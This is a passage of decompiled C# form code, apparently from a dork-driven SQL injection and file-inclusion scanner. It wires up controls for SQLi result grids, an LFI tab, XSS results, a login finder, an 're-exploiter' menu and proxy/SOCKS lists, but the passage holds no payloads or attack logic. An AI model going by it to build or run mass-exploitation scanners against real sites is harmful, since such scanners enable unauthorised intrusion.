	internal virtual ToolStripMenuItem ScannerDomainEdit
	{
		[CompilerGenerated]
		get
		{
			return _ScannerDomainEdit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_100;
			ToolStripMenuItem scannerDomainEdit = _ScannerDomainEdit;
			if (scannerDomainEdit != null)
			{
				scannerDomainEdit.Click -= value2;
			}
			_ScannerDomainEdit = value;
			scannerDomainEdit = _ScannerDomainEdit;
			if (scannerDomainEdit != null)
			{
				scannerDomainEdit.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("TabPage4")]
	internal virtual TabPage TabPage4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage5")]
	internal virtual TabPage TabPage5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage6")]
	internal virtual TabPage TabPage6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tpLfiWin")]
	internal virtual TabPage tpLfiWin
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlStatistics")]
	internal virtual Panel pnlStatistics
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lvwStatistics")]
	internal virtual ListViewExt lvwStatistics
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ColumnHeader ColumnHeader34
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_8 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader35
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_9 = value;
		}
	}

	[field: AccessedThroughProperty("grbUpdater")]
	internal virtual GroupBox grbUpdater
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnUpdater
	{
		[CompilerGenerated]
		get
		{
			return _btnUpdater;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_213;
			Button button = _btnUpdater;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnUpdater = value;
			button = _btnUpdater;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("cmbUpdater")]
	internal virtual ComboBox cmbUpdater
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual CheckBox chkUpdater
	{
		[CompilerGenerated]
		get
		{
			return _chkUpdater;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_101;
			CheckBox checkBox = _chkUpdater;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkUpdater = value;
			checkBox = _chkUpdater;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	internal virtual ToolStripComboBox cmbSearchColumnType
	{
		[CompilerGenerated]
		get
		{
			return _cmbSearchColumnType;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = method_178;
			ToolStripComboBox toolStripComboBox = _cmbSearchColumnType;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.MouseDown -= value2;
			}
			_cmbSearchColumnType = value;
			toolStripComboBox = _cmbSearchColumnType;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator3")]
	internal virtual ToolStripSeparator ToolStripSeparator3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prbSearchColumn")]
	internal virtual ToolStripProgressBar prbSearchColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator18")]
	internal virtual ToolStripSeparator ToolStripSeparator18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblSearchColumnThreads")]
	internal virtual ToolStripLabel lblSearchColumnThreads
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual NumericUpDown numSearchColumnThreads
	{
		[CompilerGenerated]
		get
		{
			return _numSearchColumnThreads;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_98;
			NumericUpDown numericUpDown = _numSearchColumnThreads;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged -= value2;
			}
			_numSearchColumnThreads = value;
			numericUpDown = _numSearchColumnThreads;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("btnSearchColumnPause")]
	internal virtual ToolStripButton btnSearchColumnPause
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("btnSearchColumnSP")]
	internal virtual ToolStripSeparator btnSearchColumnSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("btnSearchColumnStop")]
	internal virtual ToolStripButton btnSearchColumnStop
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuLWAlexa
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWAlexa;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_160;
			ToolStripMenuItem toolStripMenuItem = _mnuLWAlexa;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWAlexa = value;
			toolStripMenuItem = _mnuLWAlexa;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual BackgroundWorker bckAlexa
	{
		[CompilerGenerated]
		get
		{
			return backgroundWorker_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = method_190;
			RunWorkerCompletedEventHandler value3 = method_191;
			BackgroundWorker backgroundWorker = backgroundWorker_1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
				backgroundWorker.RunWorkerCompleted -= value3;
			}
			backgroundWorker_1 = value;
			backgroundWorker = backgroundWorker_1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
				backgroundWorker.RunWorkerCompleted += value3;
			}
		}
	}

	[field: AccessedThroughProperty("chkAnalizeMySQLReadWrite")]
	internal virtual CheckBox chkAnalizeMySQLReadWrite
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlLoginFinder")]
	internal virtual Panel pnlLoginFinder
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox cmbLanguages
	{
		[CompilerGenerated]
		get
		{
			return _cmbLanguages;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_108;
			ComboBox comboBox = _cmbLanguages;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged -= value2;
			}
			_cmbLanguages = value;
			comboBox = _cmbLanguages;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblLanguage")]
	internal virtual Label lblLanguage
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbXSS")]
	internal virtual GroupBox grbXSS
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lvwXSS")]
	internal virtual ListViewExt lvwXSS
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ColumnHeader ColumnHeader36
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_10 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader37
	{
		[CompilerGenerated]
		get
		{
			return columnHeader_11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			columnHeader_11 = value;
		}
	}

	internal virtual BackgroundWorker bckImport
	{
		[CompilerGenerated]
		get
		{
			return backgroundWorker_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = method_103;
			ProgressChangedEventHandler value3 = method_104;
			RunWorkerCompletedEventHandler value4 = method_105;
			BackgroundWorker backgroundWorker = backgroundWorker_2;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
				backgroundWorker.ProgressChanged -= value3;
				backgroundWorker.RunWorkerCompleted -= value4;
			}
			backgroundWorker_2 = value;
			backgroundWorker = backgroundWorker_2;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
				backgroundWorker.ProgressChanged += value3;
				backgroundWorker.RunWorkerCompleted += value4;
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox2")]
	internal virtual GroupBox GroupBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnXmlImport8x
	{
		[CompilerGenerated]
		get
		{
			return _btnXmlImport8x;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_102;
			Button button = _btnXmlImport8x;
			if (button != null)
			{
				button.Click -= value2;
			}
			_btnXmlImport8x = value;
			button = _btnXmlImport8x;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("prbImport")]
	internal virtual ProgressBar prbImport
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton chkSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return _chkSearchColumn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_181;
			ToolStripButton toolStripButton = _chkSearchColumn;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged -= value2;
			}
			_chkSearchColumn = value;
			toolStripButton = _chkSearchColumn;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged += value2;
			}
		}
	}

	internal virtual ToolStripButton chkSearchColumn2
	{
		[CompilerGenerated]
		get
		{
			return _chkSearchColumn2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_182;
			ToolStripButton toolStripButton = _chkSearchColumn2;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged -= value2;
			}
			_chkSearchColumn2 = value;
			toolStripButton = _chkSearchColumn2;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged += value2;
			}
		}
	}

	internal virtual ToolStripComboBox cmbSearchColumn2
	{
		[CompilerGenerated]
		get
		{
			return _cmbSearchColumn2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_176;
			ToolStripComboBox toolStripComboBox = _cmbSearchColumn2;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.Leave -= value2;
			}
			_cmbSearchColumn2 = value;
			toolStripComboBox = _cmbSearchColumn2;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.Leave += value2;
			}
		}
	}

	internal virtual ToolStripButton chkSearchColumn3
	{
		[CompilerGenerated]
		get
		{
			return _chkSearchColumn3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_183;
			ToolStripButton toolStripButton = _chkSearchColumn3;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged -= value2;
			}
			_chkSearchColumn3 = value;
			toolStripButton = _chkSearchColumn3;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("cmbSearchColumn3")]
	internal virtual ToolStripComboBox cmbSearchColumn3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton chkSearchColumn4
	{
		[CompilerGenerated]
		get
		{
			return _chkSearchColumn4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_184;
			ToolStripButton toolStripButton = _chkSearchColumn4;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged -= value2;
			}
			_chkSearchColumn4 = value;
			toolStripButton = _chkSearchColumn4;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("cmbSearchColumn4")]
	internal virtual ToolStripComboBox cmbSearchColumn4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator21")]
	internal virtual ToolStripSeparator ToolStripSeparator21
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlDorkGenerator")]
	internal virtual Panel pnlDorkGenerator
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlAnalizer")]
	internal virtual Panel pnlAnalizer
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblSearchSummary_1")]
	internal virtual Label lblSearchSummary_1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lvwHttpLog")]
	internal virtual DataGridView lvwHttpLog
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuQueueSP1")]
	internal virtual ToolStripSeparator mnuQueueSP1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuQueueAddURLs
	{
		[CompilerGenerated]
		get
		{
			return _mnuQueueAddURLs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_150;
			ToolStripMenuItem toolStripMenuItem = _mnuQueueAddURLs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuQueueAddURLs = value;
			toolStripMenuItem = _mnuQueueAddURLs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuQueueSP3")]
	internal virtual ToolStripSeparator mnuQueueSP3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn_0
	{
		[CompilerGenerated]
		get
		{
			return dataGridViewTextBoxColumn_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			dataGridViewTextBoxColumn_0 = value;
		}
	}

	[field: AccessedThroughProperty("clURL")]
	internal virtual DataGridViewTextBoxColumn clURL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column2")]
	internal virtual DataGridViewTextBoxColumn Column2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column4")]
	internal virtual DataGridViewTextBoxColumn Column4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column3")]
	internal virtual DataGridViewTextBoxColumn Column3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProxyIP")]
	internal virtual DataGridViewTextBoxColumn ProxyIP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuLWReExploiter
	{
		[CompilerGenerated]
		get
		{
			return _mnuLWReExploiter;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_14;
			ToolStripMenuItem toolStripMenuItem = _mnuLWReExploiter;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLWReExploiter = value;
			toolStripMenuItem = _mnuLWReExploiter;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripComboBox cmbSQLiFilter
	{
		[CompilerGenerated]
		get
		{
			return _cmbSQLiFilter;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_173;
			ToolStripComboBox toolStripComboBox = _cmbSQLiFilter;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged -= value2;
			}
			_cmbSQLiFilter = value;
			toolStripComboBox = _cmbSQLiFilter;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual ToolStripComboBox cmbSQLiNoInjectableFilter
	{
		[CompilerGenerated]
		get
		{
			return _cmbSQLiNoInjectableFilter;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_173;
			ToolStripComboBox toolStripComboBox = _cmbSQLiNoInjectableFilter;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged -= value2;
			}
			_cmbSQLiNoInjectableFilter = value;
			toolStripComboBox = _cmbSQLiNoInjectableFilter;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual ToolStripComboBox cmbFileInclusaoFilter
	{
		[CompilerGenerated]
		get
		{
			return _cmbFileInclusaoFilter;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_173;
			ToolStripComboBox toolStripComboBox = _cmbFileInclusaoFilter;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged -= value2;
			}
			_cmbFileInclusaoFilter = value;
			toolStripComboBox = _cmbFileInclusaoFilter;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuAboutHWID
	{
		[CompilerGenerated]
		get
		{
			return _mnuAboutHWID;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_119;
			ToolStripMenuItem toolStripMenuItem = _mnuAboutHWID;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuAboutHWID = value;
			toolStripMenuItem = _mnuAboutHWID;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("chkScanningBlackListProxy")]
	internal virtual CheckBox chkScanningBlackListProxy
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsSearchFilter")]
	internal virtual ToolStrip tsSearchFilter
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSearchFilter")]
	internal virtual ToolStripComboBox txtSearchFilter
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSearchFilter
	{
		[CompilerGenerated]
		get
		{
			return _btnSearchFilter;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_185;
			ToolStripButton toolStripButton = _btnSearchFilter;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged -= value2;
			}
			_btnSearchFilter = value;
			toolStripButton = _btnSearchFilter;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator9")]
	internal virtual ToolStripSeparator ToolStripSeparator9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DataGridView dtgQueue
	{
		[CompilerGenerated]
		get
		{
			return _dtgQueue;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = method_156;
			DataGridViewCellMouseEventHandler value3 = method_157;
			KeyEventHandler value4 = method_188;
			DataGridView dataGridView = _dtgQueue;
			if (dataGridView != null)
			{
				dataGridView.MouseDown -= value2;
				dataGridView.CellMouseDown -= value3;
				dataGridView.KeyDown -= value4;
			}
			_dtgQueue = value;
			dataGridView = _dtgQueue;
			if (dataGridView != null)
			{
				dataGridView.MouseDown += value2;
				dataGridView.CellMouseDown += value3;
				dataGridView.KeyDown += value4;
			}
		}
	}

	[field: AccessedThroughProperty("Column1")]
	internal virtual DataGridViewTextBoxColumn Column1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DataGridView dtgTrash
	{
		[CompilerGenerated]
		get
		{
			return _dtgTrash;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyEventHandler value2 = method_149;
			DataGridView dataGridView = _dtgTrash;
			if (dataGridView != null)
			{
				dataGridView.KeyDown -= value2;
			}
			_dtgTrash = value;
			dataGridView = _dtgTrash;
			if (dataGridView != null)
			{
				dataGridView.KeyDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn1")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator17")]
	internal virtual ToolStripSeparator ToolStripSeparator17
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSocksUrl
	{
		[CompilerGenerated]
		get
		{
			return _btnSocksUrl;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_200;
			ToolStripButton toolStripButton = _btnSocksUrl;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSocksUrl = value;
			toolStripButton = _btnSocksUrl;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator14")]
	internal virtual ToolStripSeparator ToolStripSeparator14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DataGridView dtgSQLi
	{
		[CompilerGenerated]
		get
		{
			return _dtgSQLi;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellMouseEventHandler value2 = method_157;
			DataGridViewCellEventHandler value3 = method_165;
			EventHandler value4 = method_187;
			KeyEventHandler value5 = method_188;
			DataGridViewCellEventHandler value6 = method_189;
			DataGridView dataGridView = _dtgSQLi;
			if (dataGridView != null)
			{
				dataGridView.CellMouseDown -= value2;
				dataGridView.CellDoubleClick -= value3;
				dataGridView.SelectionChanged -= value4;
				dataGridView.KeyDown -= value5;
				dataGridView.CellValueChanged -= value6;
			}
			_dtgSQLi = value;
			dataGridView = _dtgSQLi;
			if (dataGridView != null)
			{
				dataGridView.CellMouseDown += value2;
				dataGridView.CellDoubleClick += value3;
				dataGridView.SelectionChanged += value4;
				dataGridView.KeyDown += value5;
				dataGridView.CellValueChanged += value6;
			}
		}
	}

	internal virtual DataGridView dtgFileInclusao
	{
		[CompilerGenerated]
		get
		{
			return _dtgFileInclusao;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellMouseEventHandler value2 = method_157;
			KeyEventHandler value3 = method_188;
			DataGridViewCellEventHandler value4 = method_189;
			DataGridView dataGridView = _dtgFileInclusao;
			if (dataGridView != null)
			{
				dataGridView.CellMouseDown -= value2;
				dataGridView.KeyDown -= value3;
				dataGridView.CellValueChanged -= value4;
			}
			_dtgFileInclusao = value;
			dataGridView = _dtgFileInclusao;
			if (dataGridView != null)
			{
				dataGridView.CellMouseDown += value2;
				dataGridView.KeyDown += value3;
				dataGridView.CellValueChanged += value4;
			}
		}
	}

	internal virtual DataGridView dtgSQLiNoInjectable
	{
		[CompilerGenerated]
		get
		{
			return _dtgSQLiNoInjectable;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellMouseEventHandler value2 = method_157;
			KeyEventHandler value3 = method_188;
			DataGridViewCellEventHandler value4 = method_189;
			DataGridView dataGridView = _dtgSQLiNoInjectable;
			if (dataGridView != null)
			{
				dataGridView.CellMouseDown -= value2;
				dataGridView.KeyDown -= value3;
				dataGridView.CellValueChanged -= value4;
			}
			_dtgSQLiNoInjectable = value;
			dataGridView = _dtgSQLiNoInjectable;
			if (dataGridView != null)
			{
				dataGridView.CellMouseDown += value2;
				dataGridView.KeyDown += value3;
				dataGridView.CellValueChanged += value4;
			}
		}
	}

	[field: AccessedThroughProperty("pnlTree")]
	internal virtual Panel pnlTree
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DataGridView dtgSocks
	{
		[CompilerGenerated]
		get
		{
			return _dtgSocks;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			KeyEventHandler value2 = method_188;
			DataGridView dataGridView = _dtgSocks;
			if (dataGridView != null)
			{
				dataGridView.KeyDown -= value2;
			}
			_dtgSocks = value;
			dataGridView = _dtgSocks;
			if (dataGridView != null)
			{
				dataGridView.KeyDown += value2;
			}
		}
	}

	internal virtual ImageList imlTree
	{
		[CompilerGenerated]
		get
		{
			return imageList_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			imageList_1 = value;
		}
	}

	[field: AccessedThroughProperty("lblGuiStyle")]
	internal virtual Label lblGuiStyle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox cmbGuiStyle
	{
		[CompilerGenerated]
		get
		{
			return _cmbGuiStyle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_109;
			ComboBox comboBox = _cmbGuiStyle;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged -= value2;
			}
			_cmbGuiStyle = value;
			comboBox = _cmbGuiStyle;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual ToolStripButton chkHideDork
	{
		[CompilerGenerated]
		get
		{
			return _chkHideDork;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_90;
			ToolStripButton toolStripButton = _chkHideDork;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged -= value2;
			}
			_chkHideDork = value;
			toolStripButton = _chkHideDork;
			if (toolStripButton != null)
			{
				toolStripButton.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Column14")]
	internal virtual DataGridViewCheckBoxColumn Column14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewImageColumn3")]
	internal virtual DataGridViewImageColumn DataGridViewImageColumn3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn10")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn11")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn12")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column5")]
	internal virtual DataGridViewTextBoxColumn Column5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column15")]
	internal virtual DataGridViewTextBoxColumn Column15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tabSQLi")]
	internal virtual UxTabControl tabSQLi
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tabScanner")]
	internal virtual UxTabControl tabScanner
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tabFileInc")]
	internal virtual UxTabControl tabFileInc
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewImageColumn1")]
	internal virtual DataGridViewImageColumn DataGridViewImageColumn1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn2")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn3")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn6")]
